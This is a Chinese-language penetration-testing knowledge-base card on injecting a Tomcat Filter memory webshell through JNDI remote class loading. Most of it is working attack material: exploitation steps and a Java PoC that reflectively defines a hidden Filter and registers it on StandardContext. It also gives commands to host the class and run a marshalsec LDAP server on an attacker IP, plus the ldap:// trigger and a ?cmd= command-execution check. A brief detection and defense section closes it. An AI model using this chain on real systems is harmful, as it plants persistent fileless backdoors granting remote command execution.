---
id: web-java-deserialization-jndi-tomcat-filter-memshell
title: JNDI 远程类加载注入 Tomcat Filter 内存马（单类 defineClass + StandardContext 注册）
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-remote-class-filter-memshell
tags:
- java
- jndi
- tomcat
- memshell
- filter
- standardcontext
- defineclass
- ldap
- rmi
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V21
  verified_at: '2026-11-05T02:46:54+08:00'
  notes: 已对照原文并逐张核对26张图（02-27，文中01为空引用）：图02/03 Tomcat8+JDK8u62环境、图04 lookup入口、图06-09 ShellFilter字节码Base64嵌入Inject、图10/11 HTTP+LDAP服务、图12错误但图13 ?cmd=ipconfig回显证明构造器已执行、图14/15 fastjson靶机为tomcat-embed-core-9.0.21、图20-22 Tomcat9 getResources()返回null故反射resources字段、图23-27 fastjson触发+?cmd=ls回显，端到端成立。卡内defineClass+FilterDef/FilterMap/filterStart链路与原文一致。未验证点：未本机复跑；Tomcat8.0.53/9.0.97仅是复现环境非受影响区间，未设affected_versions；frontmatter无sources/source_url。
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-tomcat-filter-memshell/
draft: false
kb_aliases:
- JNDI 内存马
- JNDI 注入 Filter 内存马
- Tomcat 动态注册 Filter
- StandardContext 注册内存马
- defineClass 内嵌 Filter
- JNDI 无文件落地内存马
---

## 一句话结论

当 JNDI `lookup` 地址可控且目标允许远程 codebase 时，可让受害者加载攻击者托管的类；该类的无参构造器从线程上下文类加载器取得 `StandardContext`，再用反射 `defineClass` 定义内嵌的 Filter 字节码并通过 `FilterDef`/`FilterMap` 动态注册，实现无文件落地的命令执行内存马。

## 原理

- JNDI 的 LDAP/RMI Reference 可指定远程 `codebase`；客户端解析 Reference 时下载并实例化类，自动执行的只有 `static{}`、实例初始化块和无参构造方法。
- 这些执行点没有 `HttpServletRequest`，但可以取线程上下文类加载器：Tomcat 的 `WebappClassLoaderBase` 持有 `StandardRoot`，`StandardRoot.getContext()` 返回 `StandardContext`，即动态注册 Web 组件的入口。
- JNDI 一次只能引用一个类，内部类编译后也是独立 class 文件；因此把真正的 Filter 字节码 Base64 内嵌在注入类中，运行时用反射调用 `ClassLoader.defineClass(byte[], int, int)` 定义，再 `newInstance` 得到 Filter。
- 动态注册 Filter 的 API 在 `StandardContext` 上：`addFilterDef(FilterDef)` 设置名称/实例/类名，`addFilterMapBefore(FilterMap)` 把 `/*` 映射加到链前，`filterStart()` 使配置生效。
- 选 Filter 而非 Servlet：Filter 在请求进入 Servlet 前执行，优先级更高；即使业务有登录跳转/鉴权，Filter 仍能先拿到请求。Servlet API 型内存马也不依赖 Spring MVC，通用性更好。
- 该链依赖 JDK 允许远程 codebase（8u191 前 `com.sun.jndi.ldap.object.trustURLCodebase` 默认 true）；高版本需改用本地工厂等绕过（见关联卡片）。

## 触发条件

- 应用存在可控的 `InitialContext.lookup(userInput)`（如 fastjson 1.2.24 `JdbcRowSetImpl`、log4j2 lookup 等）。
- 目标 JDK 允许远程 codebase（通常 <8u191），或已用高版本绕过手法。
- 目标为 Tomcat（`StandardContext`/`FilterDef`/`FilterMap` 可用），且攻击者能托管恶意类与 LDAP/RMI 服务。
- 攻击类能访问 Tomcat 内部类（目标 classpath 自带 tomcat-catalina）。

## 利用步骤

1. 编写命令执行型 Filter（`doFilter` 读取 `cmd` 参数并回显），编译得到字节码，Base64 后嵌入注入类。
2. 注入类的无参构造器中：取 TCCL → `WebappClassLoaderBase` → `StandardRoot` → `StandardContext`（Tomcat 9 需反射 `resources` 字段，注册细节见关联卡）。
3. 反射 `ClassLoader.defineClass` 定义内嵌 Filter 字节码并实例化。
4. 构造 `FilterDef`/`FilterMap`，调用 `addFilterDef`、`addFilterMapBefore`、`filterStart()` 完成注册。
5. 编译注入类并托管在 HTTP 服务器；启动 marshalsec LDAP/RMI 指向该类的 codebase。
6. 触发受害者 `lookup("ldap://attacker:1389/Inject")`；构造器执行并注册 Filter。
7. 访问任意路径加 `?cmd=ls` 验证命令执行；删除远程类/停止服务后内存马仍在，直到应用重启。

## PoC

注入类核心（省略 import 与异常包装）：

```java
public class Inject {
    public Inject() throws Exception {
        WebappClassLoaderBase cl =
            (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        Field f = WebappClassLoaderBase.class.getDeclaredField("resources");
        f.setAccessible(true);
        StandardRoot root = (StandardRoot) f.get(cl);
        StandardContext ctx = (StandardContext) root.getContext();

        byte[] bytes = Base64.getDecoder().decode(SHELL_FILTER_BASE64);
        Method define = ClassLoader.class.getDeclaredMethod(
            "defineClass", byte[].class, int.class, int.class);
        define.setAccessible(true);
        Class<?> c = (Class<?>) define.invoke(cl, bytes, 0, bytes.length);
        Filter filter = (Filter) c.newInstance();

        FilterDef def = new FilterDef();
        def.setFilterName("shell");
        def.setFilter(filter);
        def.setFilterClass(filter.getClass().getName());

        FilterMap map = new FilterMap();
        map.setFilterName("shell");
        map.addURLPattern("/*");

        ctx.addFilterDef(def);
        ctx.addFilterMapBefore(map);
        ctx.filterStart();
    }
}
```

攻击端：

```bash
# 托管 Inject.class
python3 -m http.server 8000

# LDAP Reference 指向 codebase
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://192.168.100.1:8000/#Inject" 1389
```

触发：

```text
ldap://192.168.100.1:1389/Inject
```

随后访问 `http://target/any?cmd=ls` 回显命令结果。

## 变体与关联

- 变体：动态注册 Servlet/Listener 而非 Filter；Filter 优先级更高，适合有鉴权跳转的场景。
- 变体：不嵌入字节码时，可用 `TemplatesImpl`/BCEL 等方式加载 Filter 类；但 JNDI 单类约束下 `defineClass` 最直接。
- 关联：[[web-java-component-tomcat-dynamic-filter-memshell]]（StandardContext 动态注册 Filter 的完整机制、Tomcat 9 `resources` 反射与检测细节）。
- 关联：高版本 JNDI 绕过卡片（本地 BeanFactory/EL、c3p0、Tomcat ResourceFactory、H2 INIT）用于 8u191+ 无法远程加载类的场景。
- 关联：[[web-java-classloader-jsp-memory-servlet-webshell]]（JSP 落地型内存马，需文件写入）；[[defense-detection-arthas-agent-memshell-detect-remove]]（检测/清除）。

## 检测与防御

- 禁止将 JNDI `lookup` 参数暴露给用户输入；对 LDAP/RMI 地址做白名单，禁用远程 codebase（JDK 8u191+ 默认关闭）。
- 监控 `InitialContext.lookup` 指向外部地址、JNDI 客户端下载远程 class、`ClassLoader.defineClass` 反射调用、`StandardContext.addFilterDef/addFilterMapBefore` 运行期调用。
- 内存马检测：枚举 `StandardContext` 的 FilterDef/FilterMap、检查无对应 web.xml/注解的动态 Filter；关注新出现的 `/*` 映射与异常 Filter 类名。
- 限制应用对 `ClassLoader.defineClass`、`sun.misc.Unsafe`、Tomcat 内部类的反射访问；及时升级并启用 JEP 290 过滤。
- 应急时重启应用或卸载 Context；仅删除远程 class/文件无法清除已注册的 Filter。
